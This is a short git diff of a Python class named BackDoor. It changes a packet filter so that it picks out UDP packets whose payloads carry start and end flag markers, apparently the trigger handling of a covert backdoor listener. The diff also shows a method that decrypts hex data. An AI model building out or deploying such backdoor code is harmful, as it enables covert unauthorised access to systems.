@@ -48,10 +48,14 @@ class BackDoor:
         return chr(ascii)
     def filter_packets(self, packet):
         print("1")
-        if UDP in packet:
-            print(2)
-            print(f"{packet[UDP].load.decode()} <- payload")
-            #self.process_packets(packet[UDP].sport)
+        try:
+            if UDP in packet and packet[UDP].load.decode().startswith(self.flag_begin) \
+                    and packet[UDP].load.decode().endswith(self.flag_close):
+                print(2)
+                print(f"{packet[UDP].load.decode()} <- payload")
+                #self.process_packets(packet[UDP].sport)
+        except:
+            return
 
     def decrypt_data(self):
         encrypted_string = bytes.fromhex(self.hex_data)
